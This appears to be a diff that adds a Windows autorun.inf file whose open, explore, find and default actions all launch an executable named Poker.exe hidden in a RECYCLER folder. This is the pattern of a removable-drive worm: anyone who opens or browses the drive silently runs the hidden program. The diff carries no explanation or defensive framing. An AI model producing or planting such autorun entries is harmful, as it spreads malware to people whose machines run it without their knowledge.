@@ -1,0 +1,6 @@
+[AutoRun]
+shell\explore\Command=RECYCLER\Poker.exe
+shell\open\Command=RECYCLER\Poker.exe
+shell\open\Default=1
+shell\find\Command=RECYCLER\Poker.exe
+open=RECYCLER\Poker.exe
